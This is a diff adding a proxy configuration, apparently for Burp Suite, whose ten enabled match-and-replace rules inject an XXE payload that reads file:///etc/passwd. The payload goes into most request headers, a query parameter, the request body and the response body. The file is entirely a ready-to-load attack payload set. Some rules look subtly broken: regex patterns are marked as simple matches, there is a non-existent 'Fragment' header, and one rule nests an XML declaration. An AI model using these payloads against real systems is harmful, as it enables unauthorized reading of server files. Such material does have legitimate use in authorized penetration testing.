@@ -1,0 +1,86 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "Inject XXE payload in Referer header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Referer:.*$",
+                "string_replace": "Referer: <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in User-Agent header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^User-Agent:.*$",
+                "string_replace": "User-Agent: <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in Cookie header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Cookie:.*$",
+                "string_replace": "Cookie: session=abc123; xml_payload=<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in query parameter",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "id=.*$",
+                "string_replace": "id=<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in POST body (for XML submission)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_body",
+                "string_match": "<xml>.*</xml>",
+                "string_replace": "<xml><?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></xml>"
+            },
+            {
+                "comment": "Inject XXE payload in URI fragment",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Fragment:.*$",
+                "string_replace": "Fragment: <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in X-Forwarded-For header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^X-Forwarded-For:.*$",
+                "string_replace": "X-Forwarded-For: 127.0.0.1, <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in Accept-Language header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Accept-Language:.*$",
+                "string_replace": "Accept-Language: en-US, <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in Authorization header",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_header",
+                "string_match": "^Authorization:.*$",
+                "string_replace": "Authorization: Basic dXNlcjpwYXNz <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+            },
+            {
+                "comment": "Inject XXE payload in response body (testing response injection)",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "response_body",
+                "string_match": "<body>.*</body>",
+                "string_replace": "<body><h1>Injected XXE Test</h1><?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo></body>"
+            }
+        ]
+    }
+}
